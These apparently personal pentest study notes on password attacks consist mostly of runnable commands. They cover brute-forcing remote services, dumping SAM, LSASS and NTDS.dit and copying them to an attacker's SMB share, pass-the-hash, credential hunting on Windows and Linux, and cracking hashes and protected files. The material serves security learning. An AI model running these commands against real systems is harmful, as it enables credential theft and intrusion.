---
title: Notes | Password Attacks
author: Zeropio
date: 2022-08-07
categories: [Notes, System]
tags: [password, john]
permalink: /notes/system/password-attacks
---

Authentication, at its core, is the validation of your identity by presenting a combination of three main factors to a validation mechanism. They are:
- Something you know 
- Something you have 
- Something you are 

A password or passphrase can be generally defined as a combination of letters, numbers, and symbols in a string for identity validation. 

---

# Remote Password Attacks

## Network Services 

### WinRM 

**Windows Remote Management** (**WinRM**) is the Microsoft implementation of the network protocol **Web Services Management Protocol** (**WS-Management**). It is a network protocol based on XML web services using the **Simple Object Access Protocol** (**SOAP**) used for remote management of Windows systems. It takes care of the communication between **Web-Based Enterprise Management** (**WBEM**) and the **Windows Management Instrumentation** (**WMI**), which can call the **Distributed Component Object Model** (**DCOM**).

However, for security reasons, WinRM must be activated and configured manually in Windows 10. WinRM uses the **TCP ports 5985** (HTTP) and **5986** (HTTPS). We can help us with [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec). The usage is:
```console
zero@pio$ crackmapexec <PROTOCOL> <TARGET> -u <USER / USERLIST> -p <PASSWORD / PASSWORD LIST>
```

For example, for WinRM:
```console
zero@pio$ crackmapexec winrm <TARGET> -u user.list -p password.list
```

The appearance of `(Pwn3d!)` is the sign that we can most likely execute system commands if we log in with the brute-forced user. Now, with [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) we can connect to our target:
```console
evil-winrm -i <TARGET> -u <USERNAME> -p <PASSWORD>
```

If the login was successful, a terminal session is initialized using the **Powershell Remoting Protocol** (**MS-PSRP**), which simplifies the operation and execution of commands.

### SSH 

**Secure Shell** (**SSH**) is a more secure way to connect to a remote host to execute system commands or transfer files from a host to a server. The SSH server runs on **TCP port 22** by default, to which we can connect using an SSH client. This service uses three different cryptography operations/methods: **symmetric encryption**, **asymmetric encryption**, and **hashing**.

Symmetric encryption uses the **same key** for encryption and decryption. Asymmetric encryption uses **two SSH keys**: a private key and a public key. The hashing method converts the transmitted data into another unique value. SSH uses hashing to confirm the authenticity of messages. This is a mathematical algorithm that only works in one direction.

We can use a tool such as Hydra to brute force SSH:
```console
zero@pio$ hydra -L <USER LIST> -P <PASSWORD LIST> ssh://<TARGET>
```

> See more in [Hydra](https://zeropio.github.io/notes/tools/brute-forcing#ssh-attack).
{: .prompt-tip}

### Remote Desktop Protocol (RDP) 

**Microsoft's Remote Desktop Protocol** (**RDP**) is a network protocol that allows remote access to Windows systems via **TCP port 3389** by default. We can also use Hydra to perform RDP bruteforcing:
```console
zero@pio$ hydra -L <USER LIST> -P <PASSWORD LIST> rdp://<TARGET>
```

Linux offers different clients to communicate with the desired server using the RDP protocol. These include **Remmina**, **rdesktop**, **xfreerdp**, and many others.
```console
zero@pio$ xfreerdp /v:<TARGET> /u:<USERNAME> /p:<PASSWORD>
```

### SMB 

**Server Message Block** (**SMB**) is a protocol responsible for transferring data between a client and a server in local area networks. SMB can be compared to **NFS** for Unix and Linux for providing drives on local networks. SMB is also known as **Common Internet File System** (**CIFS**). We can also use hydra again to try different usernames in combination with different passwords.
```console
zero@pio$ hydra -L <USER LIST> -P <PASSWORD LIST> smb://<TARGET>
```

We may get an error, because Hydra cannot be able to handle SMBv3 replies. We can use another tool in MSFconsole:
```console
msf6 > use auxiliary/scanner/smb/smb_login
```

After getting the aviable users, we can use **CrackMapExec** to view the available shares and what privileges we have for them:
```console
zero@pio$ crackmapexec smb <TARGET> -u "<USER>" -p "<PASSWORD>" --shares
```

Then, we can connect with `smbclient`:
```console
zero@pio$ smbclient -U <USER> \\\\<TARGET>\\<SHARED FOLDER>
```

## Passwords Mutations

We can use rules to create stronger passwords list or adjust it to a password policy. For example, we can create a new password list from another list with the rules as:
```console
zero@pio$ hashcat --force <PASSWORD LIST> -r <RULE> --stdout | sort -u > <NEW LIST>
```

The rules list can be seen as:
```
:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```

This means:

| **Character**   | **Description**    |
|--------------- | --------------- |
| `:` | Do nothing |
| `l` | Lowercase all letters |
| `u` |	Uppercase all letters |
| `c` | Capitalize the first letter and lowercase others |
| `sXY` | Replace all instances of X with Y |
| `$!` | Add the exclamation character at the end |

## Password Reuse

It is important to check for common or defaults passwords. [Here](https://github.com/ihebski/DefaultCreds-cheat-sheet) are a cheatsheet with a bunch of them.

---

# Windows Password Attacks

![Windows Password Managment](https://academy.hackthebox.com/storage/modules/147/lsassexe_diagram.png)

## SAM 

### Copying SAM Registry Hives 

There are three registry hives that we can copy if we have local admin access on the target:

| **Registry Hive**   | **Description**    |
|--------------- | --------------- |
| `hklm\sam` | Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. |
| `hklm\system` | Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database. |
| `hklm\security` | Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target. |

We can create backups of these hives using `reg.exe`. For example:
```console
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
```

We only need **sam** and **system**, but **security** can included hashes associated with the cached domain.

We can move the files with `smbserver.py`:
```console
zero@pio$ sudo smbserver.py -smb2support CompData /home/<USER>/Documents/
```

```console
C:\> move sam.save \\<WIN IP>\CompData
C:\> move security.save \\<WIN IP>\CompData
C:\> move system.save \\<WIN IP>\CompData
```

### Dumping Hashes 

For this we can use `secretsdump.py`. The usage is simple as:
```console
zero@pio$ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

### Cracking Hashes 

Add all the hashes we want to crack to a file. Now we must run the `-m 1000` version of hashcat:
```console
zero@pio$ hashcat -m 1000 <HASH FILE> <WORDLIST>
```

### Remote Dumping & LSA Secrets 

With access to credentials with **local admin privileges**, it is also possible for us to target LSA Secrets over the network:
```console
zero@pio$ crackmapexec smb <IP> --local-auth -u <USER> -p <PASSWORD> --lsa
```

Or SAM:
```console
zero@pio$ crackmapexec smb <IP> --local-auth -u <USER> -p <PASSWORD> --sam
```

## LSASS

Upon initial logon, LSASS will:
- Cache credentials locally in memory
- Create access tokens
- Enforce security policies
- Write to Windows security log

### Dumping

We can copy it directly from the **Task Manager**. Right click on `Local Security Authority Process` in the **Processes** tab and select the `Create dump file` option. The file will be `C:\Users\loggedonusersdirectory\AppData\Local\Temp\lsass.DMP`{: .filepath}.

### Rundll32.exe & Comsvcs.dll Method

If we don't have GUI access we can try using the utility `rundll32.exe`. Modern antivirus detect this methods as a malicious activity. First, we must get the LSASS PID. Run:
```console
C:\zeropio> tasklist /svc
```

To get a list of the process and their PIDs. Find the `lass.exe` process. From the PowerShell we can use it as:
```console
PS C:\zeropio> Get-Process lsass
```

Now we can use it as:
```console
PS C:\zeropio> rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

The `rundll32.exe` utility will import the function `comsvcs.dll`, which will import the **MiniDumpWriteDump** (`MiniDump`) function.

### Pypykatz 

Pypkatz is the Mimikatz implementation in pure Python. We can use it as:
```console
zero@pio$ pypykatz lsa minidump <LSASS DUMP FILE>
```

### Results

We will obtain the following things:
- **MSV**: authentication package in Windows that LSA calls on to validate logon attempts against the SAM database.
- **WDIGEST**:  older authentication protocol enabled by default in Windows XP - Windows 8 and Windows Server 2003 - Windows Server 2012.
- **Kerberos**: network authentication protocol used by AD.
- **DPAPI**: (Data Protection Application Programming Interface) set of APIs in Windows operating systems used to encrypt and decrypt DPAPI data blobs on a per-user basis. DPAPI it is used by Internet Explorer, Google Chrome, Outlook, RDP and Credential Manager.

The NT hash obtain can be cracked with `hashcat` as:
```console
zero@pio$ hashcat -m 1000 <HASH> <WORDLIST>
```

## AD & NTDS.dit

The Windows systems inside of an AD will not use SAM.

### Dictionary Attacks

We can use `crackmapexec` to bruteforce an user:
```console
zero@pio$ crackmapexec smb <IP> -u <USER> -p <WORDLIST>
```

### Capturing NTDS.dit

**NT Directory Services** (**NTDS**) is the directory service used with AD to find & organize network resources. We can connect to it with `evil-winrm`:
```console
zero@pio$ evil-winrm -i <IP> -u <USER> -p <PASSWORD>
```

Inside we can check for our privileges:
```console
*Evil-WinRM* PS C:\> net localgroup
*Evil-WinRM* PS C:\> net user <USER>
```

### Shadow Copy of C: 

We can use `vssadmin` to create a **Volume Shadow Copy** (**VSS**). 
```console
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
```

We can copy it to a better place:
```console
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

Now we can move it to our machine:
```console
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\<OUR IP>\CompData 
```

Or we can do it with `crackmapexec`:
```console
zero@pio$ crackmapexec smb <IP> -u <USER> -p <PASSWORD> --ntds
```

### Usage

Now we can crack the hashes as always:
```console
zero@pio$ hashcat -m 1000 <HASH> <WORDLIST>
```

Or use the **PTH** (**Pass The Hash**) attack:
```console
zero@pio$ evil-winrm -i <IP> -u <USER> -H <HASH>
```

## Credential Hunting 

It is useful to search by common words as:
```
Passwords	Passphrases	Keys
Username	User account	Creds
Users	Passkeys	Passphrases
configuration	dbcredential	dbpassword
pwd	Login	Credentials
```

We can use some tools like [Lazagne](https://github.com/AlessandroZ/LaZagne). It can work as:
```console
C:\zeropio> start lazagne.exe all
```

We can use some regex, as:
```console
C:\zeropio> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

---

# Linux Password Attacks

## Credential Hunting 

We can search for different files. For example...

For config files:
```console
zero@pio$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
zero@pio$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

For databases:
```console
zero@pio$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

For notes:
```console
zero@pio$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

For scripts:
```console
zero@pio$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

For cronjobs:
```console
zero@pio$ cat /etc/crontab 
zero@pio$ ls -la /etc/cron.*/
```

For SSH privates keys:
```console
zero@pio$ grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```

For SSH public keys:
```console
zero@pio$ grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

For history:
```console
zero@pio$ tail -n5 /home/*/.bash*
```

For logs we have some files:
- `/var/log/messages`{: .filepath}
- `/var/log/syslog`{: .filepath}
- `/var/log/auth.log`{: .filepath}
- `/var/log/secure`{: .filepath}
- `/var/log/boot.log`{: .filepath}
- `/var/log/dmesg`{: .filepath}
- `/var/log/kern.log`{: .filepath}
- `/var/log/faillog`{: .filepath}
- `/var/log/cron`{: .filepath}
- `/var/log/mail.log`{: .filepath}
- `/var/log/httpd`{: .filepath}
- `/var/log/mysqld.log`{: .filepath}

We can search in them:
```console
zero@pio$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

We can use [mimipenguin](https://github.com/huntergregal/mimipenguin):
```console
zero@pio$ sudo python3 mimipenguin.py
zero@pio$ sudo bash mimipenguin.sh 
```

Or a Lazagne Python version:
```console
zero@pio$ sudo python2.7 laZagne.py all
```

For browsers:
```console
zero@pio$ ls -l .mozilla/firefox/ | grep default 
zero@pio$ cat .mozilla/firefox/<CODE>.default-release/logins.json | jq .
```

We can use [firefox_decrypt](https://github.com/unode/firefox_decrypt):
```console
zero@pio$ python3.9 firefox_decrypt.py
```

Or Lazagne for browsers:
```console
zero@pio$ python3 laZagne.py browsers
```

## Passwd File

The `/etc/passwd` file contains all the users in the system. We can see somethings in the file. For example, if the have the `x` the password it is stored encrypted.
```
root:x:0:0:root:/root:/bin/bash
```

If not, it will look like:
```
root::0:0:root:/root:/bin/bash
```

This mean we can get sudo without the password (just with `su`).

## Shadow File

This file stored the encrypted passwords in the system. If the password field contains a character, such as `!` or `*`, the user cannot log in with a Unix password. The encrypted password also has a particular format by which we can also find out some information: `$<type>$<salt>$<hashed>`.

We can distinguish the encryption type as:

| **Hash** | **Type** |
| ---------|---------|
| `$1$` | MD5 |
| `$2a$` | Blowfish |
| `$2y$` | Eksblowfish |
| `$5$` | SHA256 |
| `$6$` | SHA512 |

By default, the SHA512 it is used.

## Opasswd 

The file where old passwords are stored is the `/etc/security/opasswd`{: .filepath}. 

## Cracking Linux Credentials 

With the hashes we can try some techniques:
- Unshadow 
```console
zero@pio$ sudo cp /etc/passwd /tmp/passwd.bak 
zero@pio$ sudo cp /etc/shadow /tmp/shadow.bak 
zero@pio$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

- Hashcat - Unshadowed Hashes
```console
zero@pio$ hashcat -m 1800 <FILE> <WORDLIST>
```

- Hashcat - MD5 Hashes
```console
zero@pio$ hashcat -m 500 <FILE> <WORDLIST>
```

---

# Cracking Files

## Protected Files

### Hunting for Encoded Files

We can search for encoded files with:
```console
zero@pio$ for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

### Hunting for SSH Keys 

For SSH keys:
```console
zero@pio$ grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
```

### Encrypted SSH Keys 

```console
zero@pio$ cat /home/<USER>/.ssh/SSH.private
```

### Cracking with John 

With `john` we have many options to crack files. For example, for SSH:
```console
zero@pio$ ssh2john.py SSH.private > ssh.hash
zero@pio$ john --wordlist=<WORDLIST> ssh.hash
```

### Cracking Documents 

- Microsoft Office Documents
```console
zero@pio$ office2john.py Protected.docx > protected-docx.hash
zero@pio$ john --wordlist=<WORDLIST> protected-docx.hash
```

- PDFs
```console
zero@pio$ pdf2john.py PDF.pdf > pdf.hash
zero@pio$ john --wordlist=<WORDLIST> pdf.hash
```

## Protected Archives 

### Cracking ZIP 

We can use `john`:
```console
zero@pio$ zip2john hidden.zip > zip.hash
zero@pio$ john --wordlist=<WORDLIST> zip.hash
```

### Cracking OpenSSL Encrypted Archives

For this type of file:
```console
zero@pio$ file GZIP.gzip 

GZIP.gzip: openssl enc'd data with salted password
```

We can try creating a loop:
```console
zero@pio$ for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
```

### Cracking BitLocker Encrypted Drives

We can use `john` for this:
```console
zero@pio$ bitlocker2john -i Backup.vhd > backup.hashes
zero@pio$ hashcat -m 22100 backup.hash <WORDLIST>
```

---

# Resources 

| **Link**   | **Description**    |
|--------------- | --------------- |
| **General** |
| [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec) | A swiss army knife for pentesting networks |
| **WinRM** |
| [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) | The ultimate WinRM shell for hacking/pentesting |
| **LSASS** |
| [pypykatz](https://github.com/skelsec/pypykatz) | Mimikatz implementation in pure Python |
| **Credential Hunting** |
| [Lazagne](https://github.com/AlessandroZ/LaZagne) | Credentials recovery project |
| [mimipenguin](https://github.com/huntergregal/mimipenguin) | A tool to dump the login password from the current linux user |
| [firefox_decrypt](https://github.com/unode/firefox_decrypt) | Firefox Decrypt is a tool to extract passwords from Mozilla |
| **Wordlist** |
| [username-anarchy](https://github.com/urbanadventurer/username-anarchy) | Username tools for penetration testing |

